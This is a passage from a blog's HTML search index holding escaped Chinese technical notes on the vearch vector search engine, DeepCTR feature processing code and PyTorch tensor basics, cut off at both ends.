style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.972108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
">TF-IDF/BM25</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/xiang-liang-yin-qing-vearch/"" data-c="
          &lt;p&gt;vearch基于Faiss实现，但 Faiss 本身只是一个能够单机运行的支持各种向量检索模型的机器学习算法基础库，不支持分布式、实时索引和检索，同时也不支持标量字段的存储和索引等等。&lt;/p&gt;
&lt;p&gt;主要应用场景：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;图像/视频/音频检索和去重；&lt;/li&gt;
&lt;li&gt;安防领域视频智能监控；&lt;/li&gt;
&lt;li&gt;文本相似度计算；&lt;/li&gt;
&lt;li&gt;推荐，搜索召回及排序。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;case&#34;&gt;CASE&lt;/h2&gt;
&lt;h3 id=&#34;1-人脸数据查找索引&#34;&gt;1. 人脸数据查找索引&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://pic.leetcode-cn.com/1657552893-TyWbGK-image.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2-在线相似性图片搜索&#34;&gt;2. 在线相似性图片搜索&lt;/h3&gt;
&lt;p&gt;例如电商平台的搜同款。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://pic.leetcode-cn.com/1657552967-UpzLvJ-image.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;vearch对外提供Restful API，方便对表及数据进行管理。&lt;/p&gt;
&lt;h3 id=&#34;3-图片去重&#34;&gt;3. 图片去重&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://pic.leetcode-cn.com/1657553029-KzTWmq-image.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4-搜索推荐系统的召回&#34;&gt;4. 搜索/推荐系统的召回&lt;/h3&gt;
&lt;p&gt;将数据的各种特征embedding成向量后，利用向量相似性检索做召回。&lt;/p&gt;
&lt;h2 id=&#34;使用&#34;&gt;使用&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.mianshigee.com/tutorial/vearch-zh/quickstart.md&#34;&gt;教程文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;p&gt;查询&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
    &amp;quot;query&amp;quot;: {
        &amp;quot;sum&amp;quot;: [{ // 查询特征，支持多个
            &amp;quot;field&amp;quot;: &amp;quot;field_name&amp;quot;, // 指定创建表时特征字段的名称
            &amp;quot;feature&amp;quot;: [0.1, 0.2, 0.3, 0.4, 0.5], // 传递特征，维数和定义表结构时维数必须相同
            &amp;quot;min_score&amp;quot;: 0.9, // 指定返回结果中分值必须大于等于0.9，两个向量计算结果相似度在0-1之间，min_score可以指定返回结果分值最小值，max_score可以指定最大值
            &amp;quot;boost&amp;quot;: 0.5 // boost指定相似度的权重，比如两个向量相似度分值是0.7，boost设置成0.5之后,返回的结果中会将分值0.7乘以0.5即0.35。
        }],
        &amp;quot;filter&amp;quot;: [{ // 过滤条件(数值、标签过滤)，支持多个
            &amp;quot;range&amp;quot;: { 
                &amp;quot;field_name&amp;quot;: {
                    &amp;quot;gte&amp;quot;: 160,
                    &amp;quot;lte&amp;quot;: 180
                }
            }
// range 指定使用数值字段integer/float 过滤， filed_name是数值字段名称， 
// gte、lte指定范围， lte 小于等于， gte大于等于，若使用等值过滤，lte和gte设置相同的值。
// 上述示例表示查询field_name字段大于等于160小于等于180区间的值
        },
        {
             &amp;quot;term&amp;quot;: {
                 &amp;quot;field_name&amp;quot;: [&amp;quot;100&amp;quot;, &amp;quot;200&amp;quot;, &amp;quot;300&amp;quot;],
                 &amp;quot;operator&amp;quot;: &amp;quot;or&amp;quot;
             }
// term 使用标签过滤， field_name是定义的标签字段，允许使用多个值过滤，
// 可以求交“operator”: “or” , 求并: “operator”: “and”，上述示例表示查询field_name字段值是”100”、”200” 或”300”的值。
        }]
    },
    &amp;quot;direct_search_type&amp;quot;: 0, // direct_search_type 指定查询类型，0代表若特征已经创建索引则使用索引，若没有创建则暴力搜索； -1 代表只使用索引进行搜索， 1代表不使用索引只进行暴力搜索。默认值是0。
    &amp;quot;quick&amp;quot;: false, // quick 搜索结果默认将PQ召回向量进行计算和精排，为了加快服务端处理速度设置成true可以指定只召回，不做计算和精排。
    &amp;quot;vector_value&amp;quot;: false, // vector_value为了减小网络开销，搜索结果中默认不包含特征数据只包含标量信息字段，设置成true指定返回结果中包含原始特征数据。
    &amp;quot;online_log_level&amp;quot;: &amp;quot;debug&amp;quot;,
    &amp;quot;size&amp;quot;: 10 // 返回结果数量
}
&lt;/code&gt;&lt;/pre&gt;
">向量引擎vearch</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/deepctr-te-zheng-chu-li/"" data-c="
          &lt;p&gt;基于DNN的CTR预测模型基本包含四个步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Input&lt;/li&gt;
&lt;li&gt;Embedding&lt;/li&gt;
&lt;li&gt;Low-order&amp;amp;High-order Feature Extractor&lt;/li&gt;
&lt;li&gt;Prediction&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;特征处理&#34;&gt;特征处理&lt;/h2&gt;
&lt;h3 id=&#34;标签编码&#34;&gt;标签编码&lt;/h3&gt;
&lt;p&gt;一般有两种方法对特征进行编码：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;映射：即将特征映射到&lt;code&gt;0~len(#unique)-1&lt;/code&gt;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;for feat in sparse_features:
    lbe = LabelEncoder()
    data[feat] = lbe.fit_transform(data[feat])
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;哈希编码：将特征映射到固定范围，例如&lt;code&gt;0~9999&lt;/code&gt;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# 在训练前
for feat in sparse_features:
    lbe = HashEncoder()
    data[feat] = lbe.transform(data[feat])
&lt;/code&gt;&lt;/pre&gt;
或&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# 在训练过程中动态执行特征哈希
# 在SparseFeat或VarlenSparseFeat中将use_hash设为True
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对于密集的数值特征，通常将其离散为桶，&lt;em&gt;可以使用归一化处理&lt;/em&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;mms = MinMaxScaler(feature_range=(0,1))
data[dense_features] = mms.fit_transform(data[dense_features])
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;生成特征columns&#34;&gt;生成特征columns&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;在Input层之前需要对data特征进行固定格式的组织，即转换为DeepCTR中定义的类型。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在推荐系统中，通常数据的特征有以下几类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ID类特征；&lt;/li&gt;
&lt;li&gt;ID序列特征：例如带有先后顺序的行为序列、没有先后顺序的multi-hot编码的ID特征；&lt;/li&gt;
&lt;li&gt;数值特征：例如年龄、视频时长、文章字数等，数值向量： 例如图片、视频、文本等向量表示。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对于上述三类特征，deepctr分别定义了三种Feature Columns：&lt;code&gt;SparseFeat&lt;/code&gt;、&lt;code&gt;VarLenSparseFeat&lt;/code&gt;、&lt;code&gt;DenseFeat&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这三个类是标记特征的，在构建模型时，可以通过特征的标记来构建不同的Input层和Embedding层。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SparseFeat(namedtuple(&#39;SparseFeat&#39;,
                            [&#39;name&#39;,  # 特征的名称
                            &#39;vocabulary_size&#39;,  # id特征的词典大小
                            &#39;embedding_dim&#39;,  # id特征转化成向量的维度
                            &#39;use_hash&#39;, 
                            &#39;vocabulary_path&#39;, 
                            &#39;dtype&#39;, 
                            &#39;embeddings_initializer&#39;, # embedding的初始化方式
                            &#39;embedding_name&#39;, 
                            &#39;group_name&#39;, # 该特征所属的组
                            &#39;trainable&#39;])): # 该id类特征对应的Embedding层是否可训练


class VarLenSparseFeat(namedtuple(&#39;VarLenSparseFeat&#39;,
                                  [&#39;sparsefeat&#39;, 
                                  &#39;maxlen&#39;,  # id序列的最大长度
                                  &#39;combiner&#39;,  # 序列特征聚合的方式（例如mean pooling）
                                  &#39;length_name&#39;, # 序列特征对应的有效长度的特征名（也是一个特征）
                                  &#39;weight_name&#39;,  # 序列特征对应聚合权重的特征名（也是一个特征）
                                  &#39;weight_norm&#39;])):


class DenseFeat(namedtuple(&#39;DenseFeat&#39;,
                           [&#39;name&#39;,  # 数值特征的名称
                            &#39;dimension&#39;, # 数值特征的维度，注意区分是单个数值特征还是向量数值特征
                            &#39;dtype&#39;,  # 数值类型
                            &#39;transform_fn&#39;])): # 数值特征的转换方式，例如有些特征需要做log变换
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用这些类，可以对每个特征都设置好对应的标记参数，就可以将所有特征自动化的构建对应的Input层和Embedding层了。&lt;/p&gt;
&lt;h3 id=&#34;input层构建&#34;&gt;Input层构建&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Input层的目的是将特征转换为模型能够处理的且比较合适的特征向量。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于稀疏特征(sparse feature)，通过Embedding将其转换为密集向量，对于密集数值特征(dense numercal feature)，将其concat到全连接层的input tensor中。&lt;/p&gt;
&lt;h4 id=&#34;input_features构建&#34;&gt;input_features构建&lt;/h4&gt;
&lt;p&gt;deepctr使用了&lt;code&gt;build_input_features&lt;/code&gt;方法来构建Input层，&lt;strong&gt;参数&lt;code&gt;feature_columns&lt;/code&gt;，即提前根据特征定义好的特征标记数组&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;该方法返回一个字典&lt;code&gt;input_features&lt;/code&gt;，key是特征名，value是特征对应的Input层，便于后续使用。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def build_input_features(feature_columns, prefix=&#39;&#39;):
    input_features = OrderedDict()
    for fc in feature_columns:
        if isinstance(fc, SparseFeat):
            input_features[fc.name] = Input(shape=(1,), name=prefix + fc.name, dtype=fc.dtype)
        elif isinstance(fc, DenseFeat):
            input_features[fc.name] = Input(shape=(fc.dimension,), name=prefix + fc.name, dtype=fc.dtype)
        elif isinstance(fc, VarLenSparseFeat):
            input_features[fc.name] = Input(shape=(fc.maxlen,), name=prefix + fc.name, dtype=fc.dtype)
            if fc.weight_name is not None:
                input_features[fc.weight_name] = Input(shape=(fc.maxlen, 1), name=prefix + fc.weight_name， dtype=&amp;quot;float32&amp;quot;)
            if fc.length_name is not None:
                input_features[fc.length_name] = Input((1,), name=prefix + fc.length_name, dtype=&#39;int32&#39;)
        else:
            raise TypeError(&amp;quot;Invalid feature column type,got&amp;quot;, type(fc))
    return input_features
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;embedding层的构建&#34;&gt;Embedding层的构建&lt;/h4&gt;
&lt;p&gt;对于稀疏向量需要借助Embedding映射到低维密集向量(例如id类型的特征)，一般需要两步：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;根据id类特征的词表大小定义一个Embedding层；&lt;/li&gt;
&lt;li&gt;根据id类特征的索引去找这个id对应的Embedding向量。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;input_from_feature_columns&lt;/code&gt;函数是将&lt;code&gt;feature_columns&lt;/code&gt;再进一步处理，其处理逻辑是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;筛选id类/id序列类&lt;code&gt;sparse_feature_columns&lt;/code&gt;和数值类&lt;code&gt;varlen_sparse_feature_columns&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;对&lt;code&gt;feature_columns&lt;/code&gt;创建一个Embedding层的字典，创建逻辑见&lt;code&gt;create_embedding_matrix&lt;/code&gt;方法，该方法生成&lt;code&gt;embedding_matrix_dict&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;input_features/embedding_matrix_dict/sparse_feature_columns&lt;/code&gt;  =&amp;gt;  &lt;strong&gt;&lt;code&gt;embedding_lookup&lt;/code&gt;&lt;/strong&gt;  =&amp;gt;  &lt;code&gt;group_sparse_embedding_dict&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;input_features/embedding_matrix_dict/varlen_sparse_feature_columns&lt;/code&gt;  =&amp;gt;  &lt;strong&gt;&lt;code&gt;varlen_embedding_lookup/get_varlen_pooling_list&lt;/code&gt;&lt;/strong&gt;  =&amp;gt; &lt;code&gt;group_varlen_sparse_embedding_dict&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;group_sparse_embedding_dict/group_varlen_sparse_embedding_dict&lt;/code&gt;  =&amp;gt;  &lt;strong&gt;&lt;code&gt;mergeDict&lt;/code&gt;&lt;/strong&gt;  =&amp;gt;  &lt;code&gt;group_embedding_dict&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;最终返回embedding后的&lt;code&gt;embedding_dict&lt;/code&gt;和&lt;code&gt;dense_value_list&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在这里，一些参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;embedding_matrix_dict&lt;/code&gt;：这个是前面根据&lt;code&gt;feature_column&lt;/code&gt;构造的Embedding层，是一个字典，key是特征名，value是特征对应的Embedding层；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;input_features&lt;/code&gt;：这个是前面根据&lt;code&gt;feature_column&lt;/code&gt;构造的Input层，是一个字典，key是特征名，value是对应的Input层；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sparse_feature_columns&lt;/code&gt;：这个是从整个特征标记数组筛选出来的id类特征，因为id类特征和id类序列特征Embedding的处理方式是不一样的，所有这里是将两类特征分开处理的，但是从代码中可以发现，创建Embedding层是放在一起的。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# input_features是一个Input层的字典
def input_from_feature_columns(input_features, feature_columns, l2_reg, seed, prefix=&#39;&#39;, seq_mask_zero=True,
                               support_dense=True, support_group=False):
    # 筛选出id类和id序列类特征
    # sparse_feature_columns表示的是id类和id序列类特征
    sparse_feature_columns = list(
        filter(lambda x: isinstance(x, SparseFeat), feature_columns)) if feature_columns else []
    varlen_sparse_feature_columns = list(
        filter(lambda x: isinstance(x, VarLenSparseFeat), feature_columns)) if feature_columns else []

    # 返回一个Embedding层的字典，参数依然是feature_columns
    embedding_matrix_dict = create_embedding_matrix(feature_columns, l2_reg, seed, prefix=prefix,
                                                    seq_mask_zero=seq_mask_zero)
    
    # embedding_lookup函数是用来从Embedding层中获取对应的结果，就是将对应特征的Input层输入到Embedding层中去
    # 返回的仍然是一个dict, 此时返回的内容中，embedding层和input层已经连接到一起了，并且还将同一组的id类特征
    # 放到了一个列表中，方便同组id类特征的处理
    group_sparse_embedding_dict = embedding_lookup(embedding_matrix_dict, input_features, sparse_feature_columns)
    
    # 将id序列的embedding与对应的Input层进行关联
    sequence_embed_dict = varlen_embedding_lookup(embedding_matrix_dict, input_features, varlen_sparse_feature_columns)
    # 将id序列embedding进行池化操作，返回一个池化后的向量列表
    group_varlen_sparse_embedding_dict = get_varlen_pooling_list(sequence_embed_dict, input_features,
                                                                 varlen_sparse_feature_columns)
    # 将字典中的所有层都进行合并
    group_embedding_dict = mergeDict(group_sparse_embedding_dict, group_varlen_sparse_embedding_dict)

    # 获取dense类特征的所有Input层，在这里可以做一些dense特征的数学变换
    # 最终返回的是一个Input层的列表 
    dense_value_list = get_dense_input(input_features, feature_columns)

    if not support_dense and len(dense_value_list) &amp;gt; 0:
        raise ValueError(&amp;quot;DenseFeat is not supported in dnn_feature_columns&amp;quot;)
    # 如果当前特征处理过程中没有用到分组的功能的话，就直接将字典中的所有层都转换成一个列表返回
    if not support_group:
        group_embedding_dict = list(chain.from_iterable(group_embedding_dict.values()))
    # group_embedding_dict代表的是一个字典或者一个列表，这取决于当前特征是否支持分组
    return group_embedding_dict, dense_value_list
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中，&lt;code&gt;create_embedding_matrix&lt;/code&gt;函数的实现逻辑：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先将id类特征和id序列类特征分成两个列表；&lt;/li&gt;
&lt;li&gt;然后通过&lt;code&gt;create_embedding_matrix&lt;/code&gt;方法构造Embedding层:
&lt;ul&gt;
&lt;li&gt;遍历所有的id类特征和id序列类特征；&lt;/li&gt;
&lt;li&gt;根据每个id类特征(即对每个特征都要创建一个Embedding层)的标记定义对应Embeddng层的词典大小，向量维度，初始化方法，正则化参数，Embedding层的名字等；&lt;/li&gt;
&lt;li&gt;将构造完的Embedding层通过字典的形式返回，key是特征名字，value是特征对应的Embedding层；&lt;/li&gt;
&lt;li&gt;对于id类特征和id序列类特征，在构造Embedding层的时候，唯一的区别是：id序列类特征创建Embedding的时候多了一个参数&lt;code&gt;mask_zero=True&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def create_embedding_matrix(feature_columns, l2_reg, seed, prefix=&amp;quot;&amp;quot;, seq_mask_zero=True):
    from . import feature_column as fc_lib
    # 将feature_cloumns中的sparsefeat 和 varlen_sparsefeat 特征分开，方便分开创建Embedding层
    sparse_feature_columns = list(
        filter(lambda x: isinstance(x, fc_lib.SparseFeat), feature_columns)) if feature_columns else []
    varlen_sparse_feature_columns = list(
        filter(lambda x: isinstance(x, fc_lib.VarLenSparseFeat), feature_columns)) if feature_columns else []
    
    # 创建Embedding层的字典
    sparse_emb_dict = create_embedding_dict(sparse_feature_columns, varlen_sparse_feature_columns, seed,
                                            l2_reg, prefix=prefix + &#39;sparse&#39;, seq_mask_zero=seq_mask_zero)
    return sparse_emb_dict
 
# 其中create_embedding_dict逻辑如下
def create_embedding_dict(sparse_feature_columns, varlen_sparse_feature_columns, seed, l2_reg,
                          prefix=&#39;sparse_&#39;, seq_mask_zero=True):
    sparse_embedding = {}
    for feat in sparse_feature_columns:
        emb = Embedding(feat.vocabulary_size, feat.embedding_dim,
                        embeddings_initializer=feat.embeddings_initializer,
                        embeddings_regularizer=l2(l2_reg),
                        name=prefix + &#39;_emb_&#39; + feat.embedding_name)
        emb.trainable = feat.trainable
        sparse_embedding[feat.embedding_name] = emb

    # 对于id序列和id特征的Embedding层只有一个参数是不一样的，那就是mask_zero的设置，如果设置为True,
    # 表示的是取出来的是一个embedding序列，如果长度不够最大长度的用0填充
    if varlen_sparse_feature_columns and len(varlen_sparse_feature_columns) &amp;gt; 0:
        for feat in varlen_sparse_feature_columns:
            # if feat.name not in sparse_embedding:
            emb = Embedding(feat.vocabulary_size, feat.embedding_dim,
                            embeddings_initializer=feat.embeddings_initializer,
                            embeddings_regularizer=l2(
                                l2_reg),
                            name=prefix + &#39;_seq_emb_&#39; + feat.name,
                            mask_zero=seq_mask_zero)
            emb.trainable = feat.trainable
            sparse_embedding[feat.embedding_name] = emb
    return sparse_embedding
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过&lt;code&gt;create_embedding_dict&lt;/code&gt;方法构造Embedding层：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;group_sparse_embedding_dict = embedding_lookup(embedding_matrix_dict, input_features, sparse_feature_columns)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def embedding_lookup(sparse_embedding_dict, sparse_input_dict, sparse_feature_columns, return_feat_list=(),
                     mask_feat_list=(), to_list=False):
    # 定义个字典，字典中value默认是一个list，这么做是为了将id类特征进行分组，同一个组的id特征都会在一个列表中，
    # 方便后面同组的特征做处理
    group_embedding_dict = defaultdict(list)
    for fc in sparse_feature_columns:
        feature_name = fc.name
        embedding_name = fc.embedding_name
        if (len(return_feat_list) == 0 or feature_name in return_feat_list):
            # 判断当前特征是否需要被哈希，如果需要的话，就将Input层输入到Hash层，得到输出
            if fc.use_hash:
                lookup_idx = Hash(fc.vocabulary_size, mask_zero=(feature_name in mask_feat_list), vocabulary_path=fc.vocabulary_path)(
                    sparse_input_dict[feature_name])
            else:
                # 否则直接取出当前特征的Input层
                lookup_idx = sparse_input_dict[feature_name]

            group_embedding_dict[fc.group_name].append(sparse_embedding_dict[embedding_name](lookup_idx))
    # 如果最后想返回一个列表的话，需要将字典中不同组的embedding都拆开拼接到一个list中
    if to_list:
        return list(chain.from_iterable(group_embedding_dict.values()))
    return group_embedding_dict
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于id序列特征而言，和id类特征是类似的，也是先定义Embedding层然后将对应的Input层输入进来。只不过id序列类特征可能会多一步序列聚合的操作。&lt;/p&gt;
&lt;p&gt;从input_from_feature_columns方法中我们看到，除了对id类特征进行了一些处理之外，还有对DenseFeat有简单的处理，这里就简单说一下DenseFeat和SparseFeat在输入到DNN之前需要应该做的事情：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;DenseFeat，只需要将每个特征根据提前设置好的特征标记参数，构建好对应的Input层，然就就可以将这些Input层拼起来输入到DNN层里面去了，所以不需要做太多的其他处理；&lt;/li&gt;
&lt;li&gt;SparseFeat，需要将每个特征根据提前设置好的特征标记参数，构建好对应的Input层以及Embedding层，然后将每个特征的Input层输入到Embedding层，这样输入的一个id索引，就可以得到对应的embedding向量了，得到了id特征的embedding向量，就可以经过DNN层或者各类特征交叉层了；&lt;/li&gt;
&lt;li&gt;VarLenSparseFeat，与SparseFeat类似，但是有一点区别。也是先得到对应的Input、Embedding层，然后将Input层输入到Embedding层，此时得到的就不是一个向量了，而是一个向量序列（维度：batch_size x seq_len x embedding_dim），有时候会将这个向量序列做简单的池化操作，例如mean pooling，得到一个聚合后的向量特征。此外，有时候还可以使用序列模型，例如LSTM将序列输入到LSTM模块中，得到一个新的序列，再进行聚合。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过上述的介绍，其实特征处理部分的逻辑基本上就做完了，后面就是将上述得到的Input层，或者Embedding层输出的embedding向量，输入到DNN，特征交叉等模块中进一步构造模型。&lt;/p&gt;
&lt;h2 id=&#34;模型构建&#34;&gt;模型构建&lt;/h2&gt;
&lt;p&gt;(待补充)&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;RE：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;https://deepctr-doc.readthedocs.io/en/latest/index.html&lt;/li&gt;
&lt;li&gt;https://zhuanlan.zhihu.com/p/514763115&lt;/li&gt;
&lt;/ol&gt;
">DeepCTR 特征处理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/pytorch-ying-yong/"" data-c="
          &lt;h3 id=&#34;1-pytorch环境&#34;&gt;1. Pytorch环境&lt;/h3&gt;
&lt;p&gt;Pytorch的官方教程很详细，https://pytorch.org/，直接按照自己的环境安装对应的环境即可。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554478602.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;安装GPU版本的需要安装CUDA，https://developer.nvidia.cn/cuda-toolkit-archive这里可以下载以前的版本，不要装最新的，因为pytorch可能还没有对应的最新的版本。&lt;/p&gt;
&lt;h3 id=&#34;2-tensor&#34;&gt;2. tensor&lt;/h3&gt;
&lt;h4 id=&#34;21-pytorch的数据类型&#34;&gt;2.1 Pytorch的数据类型&lt;/h4&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554502592.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;常用的是FloatTensor、IntTensor、ByteTensor，注意CPU上的数据类型和GPU上的数据类型是不一样的。&lt;/p&gt;
&lt;p&gt;在程序中检查数据的类型时一般用&lt;code&gt;isinstance(a, torch.FloatTensor)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.dim=0（标量）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Dimension=0/rank=0，维度为0，也就是一个标量，一般loss的值是一个标量tensor&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;a = torch.tensor(1.)
a.dim() # 0
a.shape # torch.Size([])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2.dim=1（张量）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Dimension=1/rank=1，一维的向量，一般神经元的偏执为一个dim=1，size=1的tensor，例如&lt;code&gt;bias = tensor([1])&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;b = torch.tensor([1.1]) # tensor([1.100])
b = torch.tensor([1.1, 2.2]) # tensor(1.100, 2.200)
c = torch.FloatTensor(1) # tensor([3.2239e-25])随机值
c = torch.FloatTensor(2) # tensor([x, x])随机值
d = torch.ones(2)
d.shape # torch.Size([2])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;一般dim指的是维度，例如一个矩阵的dim就是2，而size就是shape，例如[2,2]。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.dim=2&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;e = torch.randn(2,3)
e.shape # torch.Size([2,3])
e.shape(1) # 2
e.shape(2) # 3
e.shape[1] # 3
e.shape[0] # 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;4.dim=3&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一般用来表示RNN input，例如每次送入5句话，即batch=5，每句话有10个单词，每个单词用100size的向量表示，那size = [10,5,100]（一般习惯将batch放在第二维）。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;f = torch.rand(1,2,3)
f.shape # torch.Size([1,2,3])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;5.dim=4&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;四维适合卷积神经网络，图片的存储，[b,c,h,w]，即batch，channel，height，width&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;g = torch.rand(2,3,28,28)
g.numel() # 4704，整个维度的元素的个数，即2*3*28*28
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;22-创建tensor&#34;&gt;2.2 创建Tensor&lt;/h4&gt;
&lt;p&gt;一个tensor通常包含一下几个常用属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;dtype，常见的有：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Data type&lt;/th&gt;
&lt;th&gt;dtype&lt;/th&gt;
&lt;th&gt;CPU tensor&lt;/th&gt;
&lt;th&gt;GPU tensor&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;32-bit floating point&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.float32&lt;/code&gt; or &lt;code&gt;torch.float&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.FloatTensor&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.cuda.FloatTensor&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;64-bit floating point&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.float64&lt;/code&gt; or &lt;code&gt;torch.double&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.DoubleTensor&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.cuda.DoubleTensor&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32-bit integer (signed)&lt;/td&gt;
